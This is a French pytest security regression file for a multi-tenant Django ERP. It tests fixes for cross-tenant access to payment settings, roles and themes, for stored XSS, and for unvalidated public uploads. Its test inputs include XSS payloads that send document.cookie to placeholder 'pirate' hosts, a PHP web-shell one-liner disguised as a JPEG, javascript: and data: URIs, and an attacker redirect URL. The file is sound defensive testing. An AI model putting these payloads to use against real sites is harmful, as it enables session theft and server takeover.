# -*- coding: utf-8 -*-
"""Audit de sécurité : ce qui était ouvert, et ce qui le ferme.

CE FICHIER FIGE DES VULNÉRABILITÉS MESURÉES, pas des bonnes pratiques
générales. Chaque test commence par dire ce qu'un attaquant obtenait.

LA FAMILLE DOMINANTE : UN OBJET RÉCUPÉRÉ PAR SA SEULE CLÉ PRIMAIRE

Ce dépôt appelle le bornage par entreprise « la règle centrale de cet
ERP ». Un audit mécanique — 525 appels à `get_object_or_404`, dont 38 sur
un modèle qui porte une entreprise sans autre critère que la clé — en a
sorti trois cas réels. Le numéro étant dans l'URL, un compte de
l'entreprise A atteignait l'objet de l'entreprise B en changeant un
chiffre.

ET UN MODULE DE SÉCURITÉ ENTIER QUI DORMAIT

`apps/websites/security.py` porte cinq fonctions — assainissement,
piège à robots, limite de débit, validation de téléversement, journal des
soumissions suspectes. Vérifié sur tout le dépôt : aucun appelant. À
l'endroit le plus exposé qui soit : deux formulaires PUBLICS, sans
authentification, qui écrivent en base et acceptent un fichier.
"""
import io

import pytest
from django.urls import reverse

pytestmark = pytest.mark.django_db


# ── Le décor : deux entreprises, un administrateur dans chacune ─────────────

def _entreprise(nom, slug):
    from apps.core.models import Company
    return Company.objects.create(name=nom, slug=slug)


def _admin_de(client, django_user_model, entreprise, identifiant):
    """Un compte ADMINISTRATEUR de cette entreprise, et d'elle seule.

    C'est le profil qu'exige `shop_settings_access_required` : un rôle de
    code « admin » sur l'entreprise courante. Rien de plus — surtout pas
    `is_superuser`, qui franchit légitimement les entreprises et masquerait
    donc la faille qu'on mesure.
    """
    from apps.access_control.models import Role, UserCompanyAccess
    from apps.accounts.models import UserProfile

    utilisateur = django_user_model.objects.create_user(identifiant,
                                                        password='x')
    profil, _ = UserProfile.objects.get_or_create(user=utilisateur)
    profil.companies.add(entreprise)
    profil.current_company = entreprise
    profil.save()

    role = Role.objects.create(company=entreprise, name='Administrateur',
                               code='admin')
    UserCompanyAccess.objects.create(user=utilisateur, company=entreprise,
                                     role=role, is_active=True)

    client.force_login(django_user_model.objects.get(pk=utilisateur.pk))
    session = client.session
    session['current_company_id'] = entreprise.pk
    session.save()
    return utilisateur, role


def _reglages_de_boutique(entreprise, marque='siecle'):
    from apps.website_shop_settings.models import WebsiteShopSettings
    return WebsiteShopSettings.objects.create(company=entreprise,
                                              brand_key=marque)


# ═══ 1. LES CLÉS DE PAIEMENT D'UNE AUTRE ENTREPRISE ════════════════════════

def test_un_admin_n_ouvre_pas_les_reglages_d_une_autre_entreprise(
        client, django_user_model):
    """LA FAILLE LA PLUS GRAVE DE CET AUDIT.

    `_settings_view` et `general_settings_view` allaient chercher l'objet
    par sa SEULE clé primaire. Le décorateur, lui, vérifie que
    l'utilisateur est administrateur de **son entreprise courante** — pas
    que l'objet demandé lui appartienne.

    Un administrateur de l'entreprise A pouvait donc ouvrir et
    ENREGISTRER les réglages de l'entreprise B, qui portent
    `stripe_secret_key_encrypted`, `stripe_webhook_secret_encrypted` et
    les URL de retour. Remplacer la clé et l'URL de succès d'un
    concurrent, c'est détourner ses paiements.

    La LECTURE des secrets était déjà fermée — le champ du formulaire est
    en écriture seule. C'est l'ÉCRITURE qui était ouverte, et elle
    suffisait.
    """
    victime = _entreprise('Victime SA', 'victime')
    reglages_de_la_victime = _reglages_de_boutique(victime)

    attaquant = _entreprise('Attaquant SARL', 'attaquant')
    _admin_de(client, django_user_model, attaquant, 'pirate')

    for nom in ('general', 'payments', 'checkout'):
        adresse = reverse('website_shop_settings:%s' % nom,
                          args=[reglages_de_la_victime.pk])
        reponse = client.get(adresse)
        assert reponse.status_code == 404, (
            '%s : %d au lieu de 404 — les reglages d-une autre entreprise '
            'sont atteignables' % (nom, reponse.status_code))


def test_une_ecriture_sur_les_reglages_d_un_autre_est_refusee(
        client, django_user_model):
    """Le détournement de paiement, mesuré sur son effet.

    On tente de remplacer l'URL de succès de la victime. Si la requête
    aboutissait, ses clients seraient renvoyés chez l'attaquant après
    paiement.
    """
    from apps.website_shop_settings.models import PaymentSettings

    victime = _entreprise('Victime SA', 'victime-w')
    reglages = _reglages_de_boutique(victime)
    # L'URL de retour vit sur le modele lie `PaymentSettings`, pas sur les
    # reglages eux-memes : c'est lui que l'ecran des paiements edite.
    paiements, _cree = PaymentSettings.objects.get_or_create(
        shop_settings=reglages)
    avant = paiements.stripe_success_url

    attaquant = _entreprise('Attaquant SARL', 'attaquant-w')
    _admin_de(client, django_user_model, attaquant, 'pirate-w')

    reponse = client.post(
        reverse('website_shop_settings:payments', args=[reglages.pk]),
        {'stripe_success_url': 'https://attaquant.example/merci'})

    assert reponse.status_code == 404
    paiements.refresh_from_db()
    assert paiements.stripe_success_url == avant


def test_un_admin_ouvre_bien_les_reglages_de_SA_boutique(
        client, django_user_model):
    """Le bornage ne doit pas fermer la porte aux ayants droit.

    Et ce test en éprouve un SECOND défaut : le décorateur comparait
    `role__in=('admin', 'owner')` sur une CLÉ ÉTRANGÈRE vers `Role`.
    Django tentait de lire ces mots comme des numéros et levait
    « ValueError: Field 'id' expected a number but got 'admin' » — donc
    une erreur 500 pour tout non-super-administrateur. Ces écrans étaient
    inutilisables par les administrateurs d'entreprise, à qui ils sont
    destinés, et la faille ci-dessus n'était en pratique atteignable que
    par un super-administrateur. Le code du rôle est désormais comparé.
    """
    mienne = _entreprise('Mienne SA', 'mienne')
    reglages = _reglages_de_boutique(mienne)
    _admin_de(client, django_user_model, mienne, 'patron')

    reponse = client.get(
        reverse('website_shop_settings:general', args=[reglages.pk]))

    assert reponse.status_code == 200, (
        'un administrateur de l-entreprise ne peut plus ouvrir SES propres '
        'reglages : %d' % reponse.status_code)


# ═══ 2. LES PERMISSIONS D'UN RÔLE D'UNE AUTRE ENTREPRISE ═══════════════════

def test_un_role_d_une_autre_entreprise_est_hors_d_atteinte(
        client, django_user_model):
    """L'entreprise était LUE et non EMPLOYÉE.

    `company = _company(request)` était calculé à la ligne précédente, et
    le rôle cherché par sa seule clé primaire. Un compte de l'entreprise A
    pouvait donc modifier les permissions d'un rôle de l'entreprise B :
    sur un écran de contrôle d'accès, c'est une élévation de privilège
    d'un locataire à l'autre.
    """
    from apps.access_control.models import Role

    victime = _entreprise('Victime SA', 'victime-r')
    role_victime = Role.objects.create(company=victime, name='Comptable',
                                       code='comptable')

    attaquant = _entreprise('Attaquant SARL', 'attaquant-r')
    _admin_de(client, django_user_model, attaquant, 'pirate-r')

    reponse = client.get(reverse('access_control:role_permissions',
                                 args=[role_victime.pk]))
    assert reponse.status_code == 404


def test_un_role_systeme_n_est_pas_modifiable_depuis_cet_ecran(
        client, django_user_model):
    """UN CHOIX, et il va plus loin que la faille d'origine.

    `Role.company` est nullable : un rôle sans entreprise est un rôle
    SYSTÈME, partagé par toutes. En modifier les permissions ici les
    changerait pour TOUS les locataires — une écriture inter-entreprises,
    pire que la lecture qu'on vient de fermer. Un 404 explicite vaut mieux
    qu'un écran qui laisse un locataire reconfigurer les droits des autres.
    """
    from apps.access_control.models import Role

    partage = Role.objects.create(company=None, name='Lecteur',
                                  code='viewer', is_system_role=True)

    mienne = _entreprise('Mienne SA', 'mienne-r')
    _admin_de(client, django_user_model, mienne, 'patron-r')

    reponse = client.get(reverse('access_control:role_permissions',
                                 args=[partage.pk]))
    assert reponse.status_code == 404


# ═══ 3. LE THÈME D'UNE AUTRE ENTREPRISE ════════════════════════════════════

def test_le_theme_d_une_autre_entreprise_ne_s_applique_pas(
        client, django_user_model):
    """Le site était borné, le thème non.

    On pouvait appliquer à son propre site le thème d'une AUTRE
    entreprise, donc en lire les couleurs et le CSS personnalisé.
    """
    from apps.websites.models import Website, WebsiteTheme

    victime = _entreprise('Victime SA', 'victime-t')
    theme_victime = WebsiteTheme.objects.create(company=victime,
                                                name='Secret')

    mienne = _entreprise('Mienne SA', 'mienne-t')
    _admin_de(client, django_user_model, mienne, 'patron-t')
    site = Website.objects.create(company=mienne, name='Mon site',
                                  slug='mon-site')

    reponse = client.post(reverse('websites:theme_apply',
                                  args=[site.pk, theme_victime.pk]))

    assert reponse.status_code == 404
    site.refresh_from_db()
    assert site.theme_id is None


def test_un_theme_livre_avec_l_erp_reste_applicable(client,
                                                    django_user_model):
    """Le bornage ne doit pas fermer ce qui est COMMUN.

    `WebsiteTheme.company` est nullable : un thème sans entreprise est un
    modèle livré avec l'ERP, et il doit rester disponible — c'est sa
    raison d'être. Le choix diffère de celui des rôles : ici on modifie le
    SITE et non le thème, donc lire un modèle commun est sans conséquence.
    """
    from apps.websites.models import Website, WebsiteTheme

    commun = WebsiteTheme.objects.create(company=None, name='Modèle Orion')

    mienne = _entreprise('Mienne SA', 'mienne-t2')
    _admin_de(client, django_user_model, mienne, 'patron-t2')
    site = Website.objects.create(company=mienne, name='Mon site',
                                  slug='mon-site-2')

    client.post(reverse('websites:theme_apply', args=[site.pk, commun.pk]))

    site.refresh_from_db()
    assert site.theme_id == commun.pk


# ═══ 4. LE CSS PERSONNALISÉ, QUI SORTAIT DE SA BALISE ══════════════════════

def test_le_css_personnalise_ne_peut_plus_fermer_sa_balise():
    """XSS STOCKÉ SUR UNE PAGE PUBLIQUE.

    `base.html` écrivait `{{ theme.custom_css|safe }}` À L'INTÉRIEUR d'un
    `<style>`. L'analyseur HTML ferme cet élément au premier `</style>`
    rencontré, sans tenir compte de la syntaxe CSS : une valeur contenant
    « </style><script>…</script> » sortait de la balise et exécutait son
    script chez chaque visiteur.
    """
    from apps.websites.security import assainir_css

    attaque = ('body{color:red}</style>'
               '<script>fetch("//pirate.example?c="+document.cookie)'
               '</script>')
    propre = assainir_css(attaque)

    assert '</style>' not in propre
    assert '<script' not in propre
    assert '<' not in propre and '>' not in propre


def test_le_css_legitime_passe_sans_etre_abime():
    """On ne corrige que ce qui est dangereux.

    Échapper les chevrons casserait la feuille — « &lt; » n'est pas une
    syntaxe CSS valide et la règle entière serait ignorée. Les retirer ne
    coûte rien : ni un sélecteur, ni une propriété, ni une valeur n'emploie
    ces deux caractères.
    """
    from apps.websites.security import assainir_css

    css = ('.hero{background:#0B1220;color:#fff}'
           '@media (max-width:680px){.hero{padding:1rem}}')
    assert assainir_css(css) == css


def test_la_page_publique_rend_le_css_assaini(client):
    """Mesuré sur le HTML servi, et non sur la fonction seule."""
    from apps.websites.models import Website, WebsiteTheme

    entreprise = _entreprise('Vitrine SA', 'vitrine-css')
    theme = WebsiteTheme.objects.create(
        company=entreprise, name='Pirate',
        custom_css='body{}</style><script>alert(1)</script>')
    site = Website.objects.create(
        company=entreprise, name='Vitrine', slug='vitrine-css',
        theme=theme, status='published', is_active=True, is_published=True)

    html = client.get('/sites/%s/' % site.slug).content.decode('utf-8')

    assert '<script>alert(1)</script>' not in html


# ═══ 5. LE TÉLÉVERSEMENT PUBLIC, QUI N'ÉTAIT PAS VALIDÉ ════════════════════

def _png_reel():
    from PIL import Image

    tampon = io.BytesIO()
    Image.new('RGB', (12, 12), (200, 10, 10)).save(tampon, format='PNG')
    return tampon.getvalue()


def test_un_fichier_maquille_en_image_est_refuse():
    """LE TYPE DÉCLARÉ ET L'EXTENSION SE FALSIFIENT D'UN CLIC.

    `file.content_type` vient de l'en-tête que le CLIENT écrit dans sa
    requête, et l'extension du nom qu'il choisit. L'ancienne validation ne
    regardait que ces deux-là : n'importe quels octets arrivaient sous le
    nom « photo.jpg » et le type « image/jpeg ».

    Le dépôt savait déjà faire autrement — `site_builder/api.py` ouvre
    l'image avec Pillow et appelle `verify()`, `accounts/signature.py`
    aussi. La méthode existait à deux modules du seul formulaire PUBLIC,
    qui ne l'employait pas.
    """
    from django.core.files.uploadedfile import SimpleUploadedFile

    from apps.websites.security import validate_public_upload

    maquille = SimpleUploadedFile(
        'photo.jpg', b'<?php system($_GET["c"]); ?>' * 40,
        content_type='image/jpeg')

    valide, motif = validate_public_upload(maquille)
    assert valide is False
    assert 'image' in motif.lower()


def test_un_faux_pdf_est_refuse():
    from django.core.files.uploadedfile import SimpleUploadedFile

    from apps.websites.security import validate_public_upload

    faux = SimpleUploadedFile('devis.pdf', b'MZ\x90\x00' * 50,
                              content_type='application/pdf')
    valide, motif = validate_public_upload(faux)
    assert valide is False
    assert 'pdf' in motif.lower()


def test_une_vraie_image_passe():
    """Le contrôle ne doit pas fermer la porte au cas normal."""
    from django.core.files.uploadedfile import SimpleUploadedFile

    from apps.websites.security import validate_public_upload

    vraie = SimpleUploadedFile('photo.png', _png_reel(),
                               content_type='image/png')
    valide, motif = validate_public_upload(vraie)
    assert valide is True, motif


def test_un_document_bureautique_n_est_plus_accepte():
    """Un .docx est une archive, et on ne sait pas vérifier son contenu.

    L'ancienne liste acceptait .doc et .docx sur un formulaire public. Un
    prospect qui veut joindre un cahier des charges envoie un PDF.
    """
    from django.core.files.uploadedfile import SimpleUploadedFile

    from apps.websites.security import validate_public_upload

    valide, _motif = validate_public_upload(
        SimpleUploadedFile('cahier.docx', b'PK\x03\x04' + b'x' * 200))
    assert valide is False


def test_un_fichier_trop_lourd_est_refuse():
    from django.core.files.uploadedfile import SimpleUploadedFile

    from apps.websites.security import validate_public_upload

    lourd = SimpleUploadedFile('photo.png', b'x')
    lourd.size = 11 * 1024 * 1024
    valide, motif = validate_public_upload(lourd)
    assert valide is False
    assert '10 Mo' in motif


# ═══ 6. LA LIMITE DE DÉBIT, QUI N'ÉTAIT APPELÉE PAR RIEN ═══════════════════

def _site_publie(nom='Vitrine', slug='vitrine-rl'):
    from apps.core.models import Company
    from apps.websites.models import Website, WebsitePage

    entreprise = Company.objects.create(name=nom + ' SA', slug=slug + '-c')
    site = Website.objects.create(
        company=entreprise, name=nom, slug=slug, status='published',
        is_active=True, is_published=True)
    WebsitePage.objects.create(website=site, title='Accueil',
                               slug='accueil', is_homepage=True,
                               status='published', page_type='home')
    return site


def test_le_formulaire_de_contact_public_est_limite(client, settings):
    """`rate_limit_submission` existait et dormait.

    Sans elle, un visiteur non authentifié inonde la liste des messages du
    site. Sur le formulaire de devis, chaque envoi crée EN PLUS un
    prospect dans le CRM — la limite protège donc aussi la base
    commerciale.
    """
    from django.core.cache import cache

    from apps.websites.models import ContactMessage
    from apps.websites.security import RATE_LIMIT_MAX

    cache.clear()
    site = _site_publie(slug='vitrine-contact')
    adresse = '/sites/%s/contact/' % site.slug

    envoi = {'name': 'Ana', 'email': 'ana@exemple.pt',
             'subject': 'Bonjour', 'message': 'Un message.',
             'website_url_field': ''}

    for _ in range(RATE_LIMIT_MAX):
        client.post(adresse, dict(envoi))

    recus = ContactMessage.objects.filter(website=site).count()
    assert recus == RATE_LIMIT_MAX

    # Le suivant est refuse, et rien de plus n'entre en base.
    client.post(adresse, dict(envoi))
    assert ContactMessage.objects.filter(website=site).count() == RATE_LIMIT_MAX


def test_le_piege_a_robots_passe_par_le_module(client):
    """Il était réécrit en double dans les deux vues.

    `check_honeypot` existait. Deux copies de la même règle finissent par
    diverger — on corrige l'une et on oublie l'autre.
    """
    from django.core.cache import cache

    from apps.websites.models import ContactMessage

    cache.clear()
    site = _site_publie(slug='vitrine-robot')

    client.post('/sites/%s/contact/' % site.slug, {
        'name': 'Robot', 'email': 'robot@exemple.com',
        'subject': 'Spam', 'message': 'Spam.',
        'website_url_field': 'https://spam.example'})

    assert not ContactMessage.objects.filter(website=site).exists()


# ═══ 7. LA GARDE QUI SURVIVRA À CET AUDIT ══════════════════════════════════

def test_le_module_de_securite_n_est_plus_dormant():
    """IL NE L'ÉTAIT PAS « UN PEU » : AUCUN APPELANT, CINQ FONCTIONS.

    C'est la signature des défauts de ce dépôt — un module juste, complet,
    et que rien n'appelle — à l'endroit où elle coûte le plus cher. Ce
    test échoue si un chemin public cesse de l'employer.
    """
    import inspect

    from apps.websites import public_views

    source = inspect.getsource(public_views)
    for fonction in ('rate_limit_submission', 'validate_public_upload',
                     'check_honeypot', 'log_suspicious_submission',
                     'assainir_css'):
        assert fonction in source, (
            '%s n-est plus appelee par les vues publiques' % fonction)


def test_le_configurateur_ne_croit_plus_le_type_declare():
    """La vue de téléversement la plus exposée : publique et sans compte."""
    import inspect

    from apps.configurator import public_api

    source = inspect.getsource(public_api.upload_photo)
    assert 'validate_public_upload' in source

    # ON EPROUVE LE CODE, PAS LA PROSE. Le commentaire qui explique la
    # correction cite forcement « f.content_type » : une recherche dans la
    # source entiere echouait donc sur sa propre explication. On retire
    # les lignes de commentaire avant de regarder.
    code = chr(10).join(
        ligne for ligne in source.splitlines()
        if not ligne.lstrip().startswith('#'))

    assert 'content_type' not in code, (
        'la vue decide encore sur le type declare par le client')


# ═══ 8. LE CONTENU RÉDIGÉ, RENDU SANS ÉCHAPPEMENT ══════════════════════════

def test_un_script_ecrit_dans_une_section_ne_s_execute_plus():
    """XSS STOCKÉ PAR UN ÉDITEUR AUTORISÉ.

    `home.html` et les pages d'article rendaient `{{ section.content|safe }}`
    et `{{ post.content|safe }}`. Un `<script>` écrit dans une section
    s'exécutait chez chaque visiteur du site public.

    Le danger n'est pas qu'un éditeur le fasse exprès : c'est qu'un compte
    d'éditeur compromis, ou un rôle « rédacteur » accordé sans y penser,
    devienne un moyen d'exécuter du code chez les visiteurs — et de voler
    la session d'un administrateur qui consulte son propre site.
    """
    from apps.websites.templatetags.website_extras import contenu_assaini

    sortie = contenu_assaini(
        '<p>Bonjour</p><script>fetch("//pirate?c="+document.cookie)</script>')

    assert '<script>' not in sortie
    assert '<p>Bonjour</p>' in sortie


def test_un_attribut_d_evenement_est_retire_mais_l_image_reste():
    """LE VECTEUR LE PLUS COURANT, et il n'a pas besoin de `<script>`.

    `<img src=x onerror=alert(1)>` exécute du script par un attribut. Une
    protection qui ne regarderait que les balises le laisserait passer
    entier. Aucun `on*` ne figure dans la liste des attributs admis.
    """
    from apps.websites.templatetags.website_extras import contenu_assaini

    sortie = contenu_assaini(
        '<img src="/media/websites/p.jpg" alt="Photo" onerror="alert(1)">')

    assert 'onerror' not in sortie
    assert 'src="/media/websites/p.jpg"' in sortie
    assert 'alt="Photo"' in sortie


def test_un_lien_javascript_perd_son_adresse():
    """L'autre exécution sans balise `<script>`."""
    from apps.websites.templatetags.website_extras import contenu_assaini

    sortie = contenu_assaini('<a href="javascript:alert(1)">Cliquez</a>')

    assert 'javascript:' not in sortie
    assert 'Cliquez' in sortie


def test_une_adresse_data_est_refusee_aussi():
    """`data:text/html` s'exécute dans l'origine de la page."""
    from apps.websites.templatetags.website_extras import contenu_assaini

    sortie = contenu_assaini(
        '<a href="data:text/html;base64,PHNjcmlwdD4=">Piège</a>')
    assert 'data:text/html' not in sortie


@pytest.mark.parametrize('balise', ['iframe', 'object', 'embed', 'form',
                                    'base', 'link', 'meta'])
def test_les_balises_qui_servent_a_executer_sont_echappees(balise):
    """`form` y est aussi : un faux formulaire de connexion posé dans une
    page publique est du hameçonnage hébergé sur le domaine du client."""
    from apps.websites.templatetags.website_extras import contenu_assaini

    sortie = contenu_assaini('<%s src="//pirate"></%s>' % (balise, balise))
    assert '<%s' % balise not in sortie


@pytest.mark.parametrize('html', [
    '<h2>Nos engagements</h2>',
    '<p>Du <strong>texte</strong> et de l’<em>emphase</em>.</p>',
    '<ul><li>Un</li><li>Deux</li></ul>',
    '<img src="/media/websites/photo.jpg" alt="Chantier">',
    '<blockquote cite="https://exemple.pt">Une citation.</blockquote>',
    '<a href="https://exemple.pt" target="_blank" rel="noopener">Lien</a>',
    '<figure><img src="/m/a.png" alt=""><figcaption>Légende</figcaption></figure>',
])
def test_le_contenu_legitime_n_est_pas_abime(html):
    """UNE CORRECTION QUI CASSE LE CONTENU QU'ELLE PROTÈGE N'EN EST PAS UNE.

    La liste que portait `security.py` — p, b, i, u, em, strong, a, ul, ol,
    li, br — aurait SUPPRIMÉ les titres, les images et les tableaux de
    toutes les pages existantes. C'est pourquoi elle n'a pas été employée
    telle quelle.
    """
    from apps.websites.templatetags.website_extras import contenu_assaini

    sortie = contenu_assaini(html)
    # Les balises d'ouverture survivent : rien n'a été échappé.
    assert '&lt;' not in sortie, sortie


def test_un_tableau_survit():
    """`bleach` ajoute un `<tbody>` — c'est une normalisation HTML, pas une
    perte : le rendu est identique."""
    from apps.websites.templatetags.website_extras import contenu_assaini

    sortie = contenu_assaini(
        '<table><tr><th>Poste</th><td>120 €</td></tr></table>')

    assert '<table>' in sortie
    assert '<th>Poste</th>' in sortie
    assert '120 €' in sortie


def test_la_page_publique_sert_le_contenu_assaini(client):
    """Mesuré sur le HTML réellement servi, et non sur le filtre seul."""
    from apps.core.models import Company
    from apps.websites.models import Website, WebsitePage, WebsiteSection

    entreprise = Company.objects.create(name='Vitrine SA', slug='vitrine-xss')
    site = Website.objects.create(
        company=entreprise, name='Vitrine', slug='vitrine-xss',
        status='published', is_active=True, is_published=True)
    page = WebsitePage.objects.create(
        website=site, title='Accueil', slug='accueil', is_homepage=True,
        status='published', page_type='home')
    WebsiteSection.objects.create(
        page=page, section_type='text', title='Présentation',
        content='<h3>Bonjour</h3><script>alert(document.cookie)</script>',
        order=0, is_visible=True)

    html = client.get('/sites/%s/' % site.slug).content.decode('utf-8')

    assert '<script>alert(document.cookie)</script>' not in html
    assert '<h3>Bonjour</h3>' in html


def test_plus_aucun_contenu_n_est_rendu_en_safe():
    """La garde qui survivra à cet audit.

    Le défaut n'était pas dans un gabarit mais dans dix endroits, écrits
    sur le même réflexe. Ce test échoue si `|safe` revient sur un champ de
    contenu.
    """
    import os
    import re

    racine = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    public = os.path.join(racine, 'templates', 'websites', 'public')

    motif = re.compile(r'\{\{\s*\w+\.content\s*\|\s*safe\s*\}\}')
    fautifs = []
    for courant, _sous, fichiers in os.walk(public):
        for nom in sorted(fichiers):
            if not nom.endswith('.html'):
                continue
            chemin = os.path.join(courant, nom)
            with open(chemin, encoding='utf-8', errors='replace') as flux:
                if motif.search(flux.read()):
                    fautifs.append(os.path.relpath(chemin, racine))

    assert not fautifs, (
        'ces gabarits rendent du contenu sans assainissement : %s. '
        'Employez |contenu_assaini.' % fautifs)
